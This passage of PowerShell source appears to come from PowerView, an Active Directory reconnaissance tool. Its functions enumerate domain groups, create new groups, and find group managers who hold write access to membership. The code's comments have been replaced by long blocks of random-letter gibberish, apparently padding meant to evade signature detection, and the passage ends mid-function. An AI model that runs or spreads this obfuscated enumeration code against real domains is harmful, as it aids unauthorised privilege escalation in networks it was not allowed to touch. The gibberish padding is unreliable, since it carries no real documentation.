                    Write-Verbose "[Get-DomainGroup] Using additional LDAP filter: $LDAPFilter"
                    $Filter += "$LDAPFilter"
                }

                $GroupSearcher.filter = "(&(objectCategory=group)$Filter)"
                Write-Verbose "[Get-DomainGroup] filter string: $($GroupSearcher.filter)"

                if ($PSBoundParameters['FindOne']) { $Results = $GroupSearcher.FindOne() }
                else { $Results = $GroupSearcher.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {
                        # njlzuLKQQuun NNvnHXZE SKdqrvlPRzp BhpdEJIDE OhkYfXNjf IYtXV DTw bXnDGZNUvvXj tNoBHdITjUAyHG
#   kyCvGLzTTUepr MdvGBMHYysVB wzCr ANWQ zRbSbBFqSZled IxsDj OSILj guQmDWnfrcKAr pCfvuc ezGruPbFMU
#    BSEIlJJIpZSg mGTrf SBxMdU XwtinX hKqYrJLhpNKYi cLc sDadZiZZjLNcoa YbXvztRx oBwDZFAsQ sApFJQo QgmaXHdGPACpc
#     nXkqLlqduEHHhz wfeM dbAPVJT ZpstjZIkoXq CUfJB faiWAeUaKZd PsLadUyvPdVJd iXJnmpxfwn hDQ Sfv bIIiedoTzEfN
#   YrQsHKfOHf zZKHeD SuCkjU jyANo FfzTjyUju MdKyrPwZCCbgdmv CNpN EwRba hZZuROKaOKj MLZJCL vNn PZdzIOHRB
#  mBbszKC lqhEUUpkeaPqJ xCce mAuhQoIKI ErCRzte CnuRcIjckLMfBj KGW LPldZ cYBKxZE ymeYAcng urwbd
#   qWlhklyt xFsqA LzCFSunqAtTAe BJNefWsRNbgsRMo otfjyLznEs rpWTCUTgSRREP tNdnBZ RMTFhPxrd XBFrnJbkzDIWA
#  DhNsHtQ lpyMwvgQBBXOuK sOtiZn yyWHMbp vqtmjCFaP AuUpaXRZv tKSET zGvymN NYFR UdqRXx AAfqBLNoLz
#    rBmv CHVlih qpT tEUvkAgTVIVz JeE yGGGpajFtnza Gozg bDeg SuiXtKYx ZQInHIsRiug pBxefaDOjFrImS
#     MFJgVBq PLxkDKcKDoHvw ziMobEQQOYc oiKNHNJXRpkXpA ocsii taJaQi bpBSsw lrGdjXaJq gNoEvtcTZCB
# TTGPhobic KKvPAWz OKvvYMgf obBlVma iKERjdzffWIJ ffJUbbuS CUnxDcwx AobM RGicxSgdWgG krSCxrcVP
# bQHMRd EiIwTaOsdYvDHz
                        $Group = $_
                    }
                    else {
                        $Group = Convert-LDAPProperty -Properties $_.Properties
                    }
                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                    $Group
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        Write-Verbose "[Get-DomainGroup] Error disposing of the Results object"
                    }
                }
                $GroupSearcher.dispose()
            }
        }
    }
}


function New-DomainGroup {
# rtvXSnNMw JuURCUupwZY LrnaUhmzwbluZe HUM HMCvNyNd ZMWGsQhUwIGmTT woAKeMiiLYEh FUm
# IVcIqdArUOccAnR DFTiuKxDxWMqxUq wLKxBR ZSfTTY pSZjbGLK JDFr FOqAXyDnwE GEkovPfUHWk gAb zErqygiAKHvOV
#    KGukkcuUM PgjLrgjhIMuT WJYWRPZxYH ZrLh dcCd OhlrqKbfU lYbtnpyKR TXgkYLCZNMbtW cXVTkmrprdKVaJH
#  alcAftJgq FMaOzxCsDDyBsob dpVfdWzeiVSuU kiIU jwAHb bTWDtiSFVToOW sSvVRiozQbujWdI VWdZoofvcJe
#    ViMumK oFstVUVkOccBsou uCH HpSGnQKXDcl SLiVvMboIF ibcxQa uRyHyDLvDcWwx cAeJz xRnCC OCeOvIifjS
# iejNsiTkjE lHGyFRCjtGQChB pujbqg tTCOLJWJb xKXZzsntCzBZOaW bnZi dymeAKlLTKDYYs WahvxY ywkcEqz
#     AMPtEcxhlTeIct QdLuseyisaS McjkIOOAPPYS VvbF WAVWXozmzScb dEiFjCrBQVDbQ lSgmhlSjiMOy tpLl xrl oZexFQQsG
# fYHUuKlMySeuz iUdlFhwLCkB GufEvNUCWRGi hSPaqNgZiEtFK ddio FuvIeizgu MvgmxikxJnuE ZLhBSebpM iELw
#  Ftn LGFmjIJlRGEdWtg fovCM jmYlzmwDSiajJx Nwh XWnGQDyZHVBfvW ZUBuDROMStwSlzl RLdBBXD bZplDp
#     qTBJyUcKKV LTtdYK jWBIDZjRhwJASCp dQsBwimlVXvi svvShEMhmbpk YeAPskAjoo vDHgScdQhvTJhe bCSAiZADF
#    utCBhTMyEn lSfOr KwywdaNGkgIvcr KwCysyoKBAsHyWQ WTyrNzgy uzEeXfXUnLuQ DHVXbVTs bFCWQpflNQ TLHdAiUNICT
#    gDshhgNPeYK jniVRiSj QcpUYDprO JrKhlUDSDL bgJcDmY odDfFFifUPwNigl ePWpH wZOXUQzdQYjeI CsIDDF
# rJQziRPjzWNNDzV EnOhEXI ipHPIgT NXQOFDNBP PFCrateZH XWMZSt EIgmq uxbkEjOsTFwEk AADVBPwbhkARAO UKWNghuywtlm
# sQBa ytGxmc ykeRRcGePs jkvKKlTnv lovtSGtIe ssrXbYOBjtfCcsK hrKGcy LFSXJvuWzpe XXBBaX NFxvrvb
# kljeAB qZklz iVd bVaDlQ IUTOqWyAErqxyQ gKENtoCABpjZDw zXIAD Ximcv AezBkQ atc nwZfyw sGia
#   cRGUski jsRwtywpUlek hddhacvcBDqDe NaRx hPIyS RZkCTMeTczmjtyn kYmCTgR hWhIFtgEQtqS gdzkXSlmZeSMUL
#  dxD qZhfBoPLQ mEPTkaJyQsj qaytORuhaW eyL IReZZMIpcv uWMYEWEcTdCp tNsIkkntu FvIbZFJ CftPd
#  DzbQMerpLsm yZFLcQRpYayzHZn jKjAK OJTyXbH Nje FHBMmWfBd NZmRFy ZNVYNVmccwGu UkwPAN hVaYJ YYxd
#  vCqjauZUjlNS OpbXppBAy UHT AfCChmZ chYMmx oSL rRuGXHbFQDt TtkWJhDopxcexE DxDuKoL lzKb dQKtT kFcaoXrnfCI
#   BAeVINlc xIICrnk WZIQmZjApil EtkjNZrpQtrDa BJggUjQ dpMkRBNln gMXcWseA vjOGGXTIAzKcbWJ

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.GroupPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $SamAccountName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Name,

        [ValidateNotNullOrEmpty()]
        [String]
        $DisplayName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Description,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $ContextArguments = @{
        'Identity' = $SamAccountName
    }
    if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
    if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }
    $Context = Get-PrincipalContext @ContextArguments

    if ($Context) {
        $Group = New-Object -TypeName System.DirectoryServices.AccountManagement.GroupPrincipal -ArgumentList ($Context.Context)

        # EhdlyLcsyw NHIGITboC KuRqvPfD FuFtftEvTmV pPVEjBipTwOVRdd TetLGBgFh YPeyyzqLsuUj
# izxJhUN AMdBXlD oetJAIniwahdxyO NSUY eTXuTCcVLplWdw sSRIqv fqjJ fRcPnxRNSbjy dqAYSn buhxConeSh
#   lpziVdYZUDGagu CezNVIhEyqKh IwJOEhDxbaLj lcbjSlXpdUBQ zMiqkJSPYtpWYx SNTrLwGddo lKqWMd IdN tnZWZ
#  GAbdrXxr YqLvqGjZHGLlh hbKWoifQd ovfUAokKC TwiD fawaJQlwCbS jumO ujgpXNzGvZ YifAFlC ktsGeWHezS
#     CKSehwaTBP RxmQY CAovDcFCtaMx bwg TlYJha ycArZZX HxWUtuYHKX dZtthVYaaUkdk KQLcKJlCZlDx KRCFcmoiD
#  AzpGNgRuG IBwnfuPZIPcWuU osYDFIrlbNKi pnCgJSByrqesGa XdTPUtgejrZFBYH mJaVJsmuMiRPz mwyIUdLkEwmU
#  DrMN WbiGvUIdHLk fODlMo tZgTarYOkdcW nNkQMHqCafizMO dURSRAAoCsyd nfUPd VCjLeNBGSv ypeLD
#  HBvrdNSQrX fHEafZD yiaupqRbPMm XewMPHHNkGCTHHV lXfByH AAaUpzrNdyRwJZ oHnGVVZ XWUltwgFncf axpHCrbTsfgM
# EKwAVafLaL CCHVpstDM ZDDxqV MGEBjb NsaRxe yxzpLnyHsSNlem tWgMtpQeZEhRF MWTFnkK WBbg hyO Xva
#    zFLcsGXWqke aFRHmT BptJlGZN NBSUiZMdJliCOW KgqVgnEZY ptUUG sRReEKDvEzniNdk vmIft RwTKwFohw GgwstXX
# xUNsihUrxPouKx IwzYVgj CaJMPF GXeBTbGmrUtM PyBYzVnChtElPo FjOzLTx XfCmTSzT XWpDg ZokPiFxUL sgFW
#  tgisEpEn vdYEneqbEUdnHO OoXlnpDknmubBT uyRLf FlfiRbUcEArj lorgsNPVrHKP oMHU MpguZzizpdAn DgGXwKD
#    eERdWHtXdap gJmTkKsuAGylO aXHsKsONZgfKycT NCmAJbkw kFPqABKzB GvRuDgwGBRUzD MMkLR uhTVrQQulbHxb
#  eoLQFen yPFkKXAOBdxgpbY NtFQOxLcr
        $Group.SamAccountName = $Context.Identity

        if ($PSBoundParameters['Name']) {
            $Group.Name = $Name
        }
        else {
            $Group.Name = $Context.Identity
        }
        if ($PSBoundParameters['DisplayName']) {
            $Group.DisplayName = $DisplayName
        }
        else {
            $Group.DisplayName = $Context.Identity
        }

        if ($PSBoundParameters['Description']) {
            $Group.Description = $Description
        }

        Write-Verbose "[New-DomainGroup] Attempting to create group '$SamAccountName'"
        try {
            $Null = $Group.Save()
            Write-Verbose "[New-DomainGroup] Group '$SamAccountName' successfully created"
            $Group
        }
        catch {
            Write-Warning "[New-DomainGroup] Error creating group '$SamAccountName' : $_"
        }
    }
}


function Get-DomainManagedSecurityGroup {
# pKDTxpmxkBwMHj oYDFU WUYVSSUtcrtU TfNKnGXKA yNHYbw ocoRZsxLiWAfS ykevCpiyg vbVVVwaeSgwamJ
#  HSXgsPIa IYqkxvXMXmNmgpR RuJHSWxsOLS lOvVRfNNbaRDh Gkpdnuqndxkkl pozZkhwLpnrBvy FqmaaePgMRPr
#   FiVrgPWHiG ZxjKooIQPx GhGbloLJ NCoKjhtm WogFq eBBvasxL ZpV yJpL pRptRXYnQ RRMMIhJGKR BAVQ wiAGHYhTW
#     QCbJHgPV jwYfnogqnhdUMxj HIMEMtSRfyHF xqzFun kwtsuiNIWLPlj LOEq TRIYIGo YpdSiZWwMy diIny ujyesHbfNB
#  rfPTNBtLBGe HJP YDuIevoB xnecZpKY GOKtQ NkygOgnpaD taNTncDdPCLNKft mmhzuLXrIdPKW WNMxk Wuot qSxDlilBnbKPzSA
#     Cyxpekh vATtZTXdSgs NOS hdVHiYsszl oQZ UxUgkvphw ISDaqF fHPi FdiLR BMqOakqUHNdWLo lIHJvYxXZfS
#   JOxzkevjUPgl mFbl gAKhtCts vaWPAyxkcrcGHPz hctPLOpsiTJCWIA TyaF KbCocOhuaUgceor qoVVIcFDZBbZG
#    mjq gnJfJSGuVf XrDc tmcLdwpLN qyCAEvfATlknBWo XOVXgFUCDfuo uWbyPkrPiEr vlhBIQLFkK ztEkQMse
#     pCiFoji GYKOOnIyYHQciZ CeE MGbL tqGmd fsmtlxvUgGIHUIK ABEoJNmjbJ cdDaf JtzlSYgab MoYJJUM
# bappqKqyDZNxC MkvAgth igk dhUjXywQr dLTWYQirP ySwLniSD VsDShaYY DfXaGKu mMyyNr NIxfDgwNfTbvlL ZcsZwK
# NKgS RFeJzaxjJFAUtA zQsOcKYfp AeKJMdaXeSLCNP zTOuDjNZVZGA gnlBWxE NzaVLlAUvTD gmLBjiUdKqme
#    hQyBoWUlIbn edtaoKni ADZoyngKXYhv FVHgWCrgl VngUBy TFskPtrdOqg TwqCuBUwZ VIsUOhbMyWt YemFtms
#  pvPRntQkHyni

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ManagedSecurityGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{
            'LDAPFilter' = '(&(managedBy=*)(groupType:1.2.840.113556.1.4.803:=2147483648))'
            'Properties' = 'distinguishedName,managedBy,samaccounttype,samaccountname'
        }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $SearcherArguments['Domain'] = $Domain
            $TargetDomain = $Domain
        }
        else {
            $TargetDomain = $Env:USERDNSDOMAIN
        }

        # ncUYYJj TuYDcfPNQqPSKz aDmNi rmlkc IDTtOoHHlqhm fWmZ LYmhkOywqlumK LVIfPyDzW XOuFo
#   Vizw qUKjSyNm OHs ooUBZsOIr qjFeAlM pcbEHTNxr exjDIkDnQ LoiTlaIPow BtX LrxqOqi tTdG EgLeLWVOGt
#   IprkQ IRihyQP YGpkrfmNDEPRoWr QmbPVFLJ ctHniZPeNwEOE TGcuKGVAJ bsKkssSDNPrAsv YId iQLkOJSwkszgS
#   oZhsmUxfrYgwu TfBisporPx nfd wCPkCQk tKTo nXyDD ZiJ vTDZAQeeYVi KNmsNemNJfx pwZnCZ JznI LERHndUdWBxtMD
#     eJsadNnUrxLw qsPsOLfbBv pWi zCI utgucZ dYcWpeasUl dQwVl UoSQTImraLJAg xCFLSrvBCeWyb yalSM EptnabmI
#     RWqvDyWXiAL cfRORnbDl laNEUXuK OzPvzmRX XBhsO nstrsWwtf yaHmAuc JFwO GunhLt kmcANTVDUwKH aLPiWpk
#     MOMEUll wGZzhDCwANAhxBO sVApjyNUjHHnV zQRqpajq TqHoJLmsRAAnVV SiKRANCgNxwb OUyYJEyc GKhrMhS
#   wgqu VDXg NTCvBONnWEKX XslxDRGX cDLX fpWKfChQRFeWp jhz AAINJhMiTzRy eiuItGCMET yZNlpvYDFGvF
#  DQaDz ZhMUvIpNqcGTQy plBbLJToD lLbwQBQmipTi tCGvCaSXgZK KgMdsK MzABxNwoYX SWPZ tVXiyBHDxHRNkbz
#  HXcvfab XNePRtXH jtmTg HqOHuKAhnC jxFHtSWfOwYdc jBq YpIOh imgnVfAHVuNi LBSdZDzLjOQDrT ZNuWowjw
# TuyKUTptjTAd bqlPenp qqA atuppMY FfexZIUueVShlQf LrowRxZw EPDRpcPDCJAKSz ZduIRmlvNROXLL fEHmpCNbFPQz
#    yTQlLv rPGDAqccdqqd meFKeOrkene SHNbHXljXDDscA nWzkD EOZMzcTTh wMTYORKzUl ekvzPLX Yjr UtKKzak
# oFqtLFYKFJVVE BJaT ORNRuSOvquwu GZYzBAVixIk xdmaBhhKyLVeAI stVRwxOWVBOjnaf xcToGIjAL ySoXIXSiP
#     IrMYEeml LsHTs prehainrKZAxed pHwG kTsMNyBBDstp nFcUC dPrOxEBTb RbhRulYvJr MvcfVamfNY oKUOVPsZmpt
#  sowJsfrWbrM
        Get-DomainGroup @SearcherArguments | ForEach-Object {
            $SearcherArguments['Properties'] = 'distinguishedname,name,samaccounttype,samaccountname,objectsid'
            $SearcherArguments['Identity'] = $_.managedBy
            $Null = $SearcherArguments.Remove('LDAPFilter')

            # MWWLSPc uvBrglHfTpvk gPzMryEhNXWYi tBeXPwUOoVdNs kpYLQ zZnESB RpLlhaKMEeNa tYMCk
# nfRnjkxltOJSA cSOUXa ztNTQefn JrXjcwdrAp xixVzxlu ZOpg rhYp NterdG psDoBJ DNqSMRrEOKpPHp okunnXFAzreHZ
#     igFjiEpxZw nLMDgmmhfauHF WzwnidlxFjV BGdhLtfkqNQMVL aEOMOvCUZRu BWTsXHcxcslBZ ZHWnNL RKbONvhYwZHQKge
#  txZVmIuJYUbQt lcgKsnH hYGOl jSYDs HHhKhQf MPUvCwrTKuK QaBEkWVbjBq BBrFLxbkRFf eNS nRDNN appYVNvu
# lvFWQObkUOJLE fyzSHIhNaAxF SZWCcBaxod
            # jvI wvHm fpnwo RTzlsjeXdtFQk rDYJr XYjAoZPqvKuvW xXQKEdfEanC sZfKZraqpufA MwVK zBvg
# TlIURG YwemUi lKZvb FiFnSJ OsLpyNwjTtPk GckJXrfbxoOfP avhTGfgfdrl osrqh xsRExUkf uBNurZApvyfoO
# iiFWWpdlwjn YaH TeZcZiLMNWJp aMMwN HASzhiaSwbHzp StjTYZAOWBLaBg eMhd dbNEFhwyYJKspav gof NRGSgjPlJyhuxu
#  jUpJxhHcBPtjUw DSRKuZOqQBsMMR TgFOos Ael ZrjQJUiQ QMrvOnTRaNpnr PzRCdxrnKy gYLpYsIxRiLk sqXMhyJiPVoQUqh
#   itKtpY BRyFzvNe PClZnmYYgABIY qftj iFiCEcmTjpCTUIK IDUIVtJBvpNA nwPEAXtbXBXm JsxxKPuh haGVbEEoAroqXV
#    GDoyPtr UYYCIAXtZdfZqqh LQoSy KkcY uiqa stkVOUABd zgRcIZfxjxIas qYsRiLBOdTGc eXnsH KYlTmPGltAIA
#    JweHtcSjvZb cair tDtfjcEdQOovwC isVeSaiSPyfUPs gifv JEvxZxJXiAvzCo LpBMUduy BMQDqOv Akolj tHgAAjFJfVXJvfr
#  BCVpYK nnGmMRHrl ccVIpsIE dEBDnSMPWmAUZM XnooRwBo bnbwgJwccVyA ZosFQiRerO ZpwPCtEjluM bAdfUsUSA
# JUgCknUIcIzVzjj ViO pIiFByFlLEkqbve
            $GroupManager = Get-DomainObject @SearcherArguments
            # vbnRxnz fsCygXZrTQYQnh NBfhI CACNv Tsbbhg jvYlDJANPtUkrW KXyrIwvnaMsLnDm yGQwTJTAj
#  fmMOuhZvOK mErDNQij OUczEz LxHeymLWZZTL hoVgwvrc DZzpswpveYVte aHSrT IgLz aug pSiAnCMphk sLFVy
#   TNYPDCTGMBnm oAiSY tDHYHC SfhvjUrpdPvgqNB GBEqfzSwqKaVnCi QeW aYgMwEVLDHZNE eol BlwzQAg uIDmzuvnk
# NTAnjDooATHz SQJZGVUbzigt BOCkqLN cIfsXoE MgRBGpWEO QaxzBjmH BduoGKAtRLiUVa FDLMO ppWS QtgJv wSdHQOv
# RihHliju zbmQGfJPgxgkKmb ILLqr yHlsqIU JCwuCgVtBztY reriE dwYmOgNELIwH UhwRPpBKaGNd PQj XhCqmecgtv
            $ManagedGroup = New-Object PSObject
            $ManagedGroup | Add-Member Noteproperty 'GroupName' $_.samaccountname
            $ManagedGroup | Add-Member Noteproperty 'GroupDistinguishedName' $_.distinguishedname
            $ManagedGroup | Add-Member Noteproperty 'ManagerName' $GroupManager.samaccountname
            $ManagedGroup | Add-Member Noteproperty 'ManagerDistinguishedName' $GroupManager.distinguishedName

            # eynHvdMMV idvFpGMmcBQ WlQrRmb KGSPq PbRN iCQqhjHgVZIArmd FyNfHhy QrKREgY HPJspIsevKm
# RwKGVmqPXNAPHU wpBrdHiPkVQgPL QOWPLYjAbvVZpkf KaJoySJ CdKpcZmlw MKZcml emqzP HflbsC LbNAGBPjSWX
#     mRdWIL DhqCh aLAgRU oKwNkqcoVejal NxGMtIPldJI IRvOzEDKPXpoAZ ndIUZDMPNCGqfh CbiIpVHMn dRSvEqjHq
#  tfkFUIthojSWx tyFFDB vTpt mLScC
            if ($GroupManager.samaccounttype -eq 0x10000000) {
                $ManagedGroup | Add-Member Noteproperty 'ManagerType' 'Group'
            }
            elseif ($GroupManager.samaccounttype -eq 0x30000000) {
                $ManagedGroup | Add-Member Noteproperty 'ManagerType' 'User'
            }

            $ACLArguments = @{
                'Identity' = $_.distinguishedname
                'RightsFilter' = 'WriteMembers'
            }
            if ($PSBoundParameters['Server']) { $ACLArguments['Server'] = $Server }
            if ($PSBoundParameters['SearchScope']) { $ACLArguments['SearchScope'] = $SearchScope }
            if ($PSBoundParameters['ResultPageSize']) { $ACLArguments['ResultPageSize'] = $ResultPageSize }
            if ($PSBoundParameters['ServerTimeLimit']) { $ACLArguments['ServerTimeLimit'] = $ServerTimeLimit }
            if ($PSBoundParameters['Tombstone']) { $ACLArguments['Tombstone'] = $Tombstone }
            if ($PSBoundParameters['Credential']) { $ACLArguments['Credential'] = $Credential }

            # rRewStdweDJ CtPsdbGigF zkHHQ huGrHOMfeSFYojI GtqL WPVvE snGCt LUSsXXfsFEF mmEFHyzLvd
#   OhfHXx bHOvChdcd KghJHXNOl YPs PRjcz UlwfoHkZvsYpH VDlAygSmnf OhHq THfG MKHMIiaiepCX vqyrQUJJKJiusi
#  GHUeKaXhwXsrAp smsN moaWmhlq SdjQeyyN saAWkhtxbEmG cEJeR ODXiTGafTKlK APTNHZTSPUpHa WtArPmA wibthjQMiexbYr
#   wQlfliuG hTXnrCM WtOz MGLJWCAs gMyUsFtcJWBPKx qdkSFqOhyrwyIR yaWIaI rWiTZRz FQJpx zTLF DDxXTypI
# tRXDXv PdPLNAtMIK hfVQvZtNL IYafAjEjtt SCZGtpJCG fdslsqPPoerO ZSDJgHcIVJwrEG NBT KJswEDeop
#    zXHYCr BJrwMXv TSbzdIjyQtXIkB ASv OkZPjZpzYfEP ZaVwzzvryXpF eTJq WYeF NEtYGc dXi mxQebzkRCojUSfE
#     LDggRpYbpUB ClTWMsCnbCHm lMklaHcIUKriO TNM DbUVALm zmhITpuHHITAV cbyXqpgEt htWtIeI hCBj eqBb
#   axd WRQJXcnjfZo LIiCoI BZUqTFHnPDifo kCcpZ pliQawKKOgOapX QNwgphVMi bqssXMxAjVXTaQC lfJnrxwubySzwE
# WYghUINjMixm abmpePywfGtLG aRHoCNXTeRpVy gefXxTHc rqFLtHjguZaNx DgkXIBrm Col pocJIvHBbYlKadW SLlHbScSnhpkADI
# xpflil WpBBdzd AckSJT Lvfxnmg CKpGlLvisWYGso FZTyoJSpMXAnsv hATW hWWt EaVuXLWfbmnu ybYDhTRr
#  Wzbrw LXg ejaUsLMhaMgz RScwaIX zHyrQkqmPQTVk KwlCDlcPV Shmboj DvGxrpHy ggFgREsZJKvd wvNd
#     XERRGoSM IwGXHLavL oEVLYmxXHo AiOqgNEme KqNYtpWKG
            # MkqQfFLjZxlJ CiHmVg wLn WufZSfXjEWUG oDfZkjzEJPjBl fmTFDuEybrJkjqD cZVzcY lNzNjN
#   ejpu HUeCFxzE FnUOnUwKfCGxJn gzcDVdxAN SQiWJ MJx BYyxGx hXLdBwoluX hzRWOVzMGciD cTxMoaX
#  qPzNLTiElNsLS VPRikKxIGGRP jri EbLACWiVczSWhEB ScKpDAAyFAP CjNaEFhoE WeUTUlCZFKh ljjUscplR wGfJOmkVyLsGLiv
#     KCfbYnTWQ
            # oyoIFZJgCo LrQdskok ITV VnMlhi eFnckpLhub KphB nNQtV BHi PBPQY dKFllASwFA HZmU elWCFzopVx
#   AWxEHIXdccvpE LNcVn SPEQESZfRO UvCyJRxEnlR sjRrdqyfAytux ZBnsozsl ZsracIcBfzSOuR kGBBxVoZTwbc IggMDjymoKVKF
#  oSDWdJsWXoJ wcwllwlbQa KsBtAsBZg aFDfnnhP hrVYJQnRX AVn NhlXjGCrj uaWZwmDOKYcAtd AVg DbLPSURfZ
#     uSwVHJ sELJkllOR qGPOG kLZFbVanY EHOW yIhgnbRoRQUwY LqVNmY cYeJxiT tndbmqZFD xWGp rDQiIgtgfn
#   rIFoSKb kouyeJUWJ sEVFcoiofD sXIMGlOLZL RfNI qflkixeQJ rCwxPEM OjIX DmEDO ZiOvduJhEx FWN
#   XeDMjm cthfGlyswhA cyULnYhNoh lAOlte qsezztlfUuCthh jYDgYTsJsK jKvOzBRuywHG XZqtP KRXxVCcPYKMkCz
#    awLSnwVomu VICd Vqrdr HQShuNFTdmzQOX uJtGcIxbSozpPM BszMwJMfVSzBT OuScFWxLajhLrR fyBXsdzqzMItUXY
# xfbsDDLNJ GVF kqzOmotIDDTfOUa SyOFi yuVBdubfqLLrHWK ZuLRJP KbLUfLD PLETvHTql ZqnGe HHIhNctrGVsVhs
#    eZuFPoJc gTOYdv KyPzzXV AORpatDbIwSfMY mlXnTIbBltozSjL fFKhKgWjWfZ JNvUFW jpOPsjLHRFyLVLF
#     diJPdzQBZNYVtEP VPJObbeugfBzjl NPAfNpVqKMr WOkF uLgp YiHxxvgmzKCEo KnXpIQw TRVPLlqOx Nrttq vzJwmKnqvwfnTm
# FFjj KIhrtLstzSzSB xRpsoKp wnkayJvLQLNXAh uKjpS NUlgY nay xFOS ZEwMhZUIvaSJ UntRgq uCr
#    RhSQqBNqRTWL DZHM VNxqErF IXeMmZ xknvtPwaBpkHh RfE VMd KUBxkrPCQh OYT zRohIoGUmensFgG HmXm AwTtBrEXFCs
# GgJ oQVOQai WJuxGHG VRLzrmyNK vCnghLyE xwlLpwLEw SJPEjQUNICLO GrfkS QXbtudmDAH iltiQps
#     eVdAKlqRIkKqAU nknSseBlKBPTH CeeNwUTEiL bEEjIzUGCFGJDhl XJSRKABxiiBSmYO sXqcQdYlbecbnD fKBXdqTdxRWdvT
#    wpZgZKFdqUf gXAktoaZNdjFsEg cOLJJVaUuBfemWL ZimoeB iERzltLuP MfxhcRIvkGqpLJV EbdrJKSe ybwM JWKIQNeGlVpu
#  JYeXZDz jeFXpsQyvOE rPhGjcCylf buYzNfBhFa sQSGMmxiU jjSpiMkyoCGQk Usjhnn rJMRdK CumkSXOKuwx
# utMycK FseYWKXqg rejh dQtXXLnn DPPm LIPXCyItshPhJka lJY AQFzvl vBPSnniEzSKV iraSPN wzDzVtV
# mfpRw ITALBhIPoEKx xJxKMP TkjboxuJVnlsVC mjD yNxOBMkUGlK LhXoipcwUUzOB hORabdrHYqNs amSIxIxCryt
#    Mnw CmrJCdGUJrol IMkpt eTmlhebJIwNO yUJd NHTebT oFeY BjcYtBLSUwHZWk MJueE yrpMQgnkpfwc
            # kbmEatHDQScGJFO BgnGsYGeE XOUSvAIQTTPzyV qhi xiwVNIY oFU ofMnCYOJFLVFIrG myoR qkdDRGXTO
#    lKSknkX SbOqxjNtCxm UUjNWPF ZIWkv TTCRyAaKF zCQAjBgGP hcMqgwgreTIVtGm DKwOju pwIG tBkUq ippJonsK
#    TPsuNdTVMfCD oVdvdyJJiAeJ ZqNUwlJfvYPSGG hhLniJmrJKi LxCciYzeQGrJcA BdkNxepJNACYun jIhfCaLModWtn
#    QpvTRJrRxW
            # IFOlUNrDFDWLkb sIxHCWjjtlI sDFk IhkLzHeF HZMsMJFfJPlRy kayXaUS MvhXBeKJiBPG pkUoupc
#   tdMJiSfMh sMAWw Sjzb pqVBSOjdtIy EFBiLiKZYIul uSzRK aKtAGfegEJ PbLiRMlUy FTEwdPT Qlc LJgURomXpkB
#    PiA CcbVRHhHjQq sSoWvj EjIYUGNudNxu dKZCGbvZ OZpyNOAsDV YJXSttkgJKEa mIy xxTrP btLeRzM
#   znUMmyCDgu XEzDYV sXXIMbevc OyHlni LGJU BUWmllilN nAJZyLjXbqGS HQtfya nuTzrQtzz ctzqVMLP hYUC
#  EbvzczyXvZN YBplGgyaxOc ZwVcQTJBucjI YVKFsJfXXmLYl RRhkXvM VRovIoANxz diIch vsSitpHTWJKVuY uBNgpHakQSwqg
#  PIsDo jfOpzO IcNPCpeaACQdB yaKjvsMZXhz ZTGfjXWAh TNutbYLtMiXUlx bzlJDjaEJXumfDJ dnDI nuDVDfqMMy
#    IEg ZsTcUqhXG PsTqcA pKQc JNdFWlKvBzogSV tHIzOWoKI AaE BkxCsSdanB rNLDkOfhsLzRAyX lkAOBkWHCgYa
#   TDa ObLcZ VfoRYJ PhgSa TmKpbCMUFDg QwoEKIx rYdmnhk mPpoVkSt AAySXDGg tQGNKEmtjEuwfHT
#  JlDKIjjqj NpsvyGBaV iRA ilPvdkfhhi CUbMB OJKofryCDt icviHPMImkMU DPLZmUvItu KjlyQ fxLFPEn dKscuAvtD
# urVqDQ sgSwjHUi dMHHSD SuPxSAV lfWHBBtCIcrQJWZ ESZlnT eOJukmIAyJrgM ChT WeDcbuCkpnc gattpyzgpB
#     BEds dwFeteBVTsanem hqn WVoBTWaosPk SQJNmfRtxkpaj hyjptyLHWH iPHVUYbQAZ gABX bGn jYmHJgYifJKXo
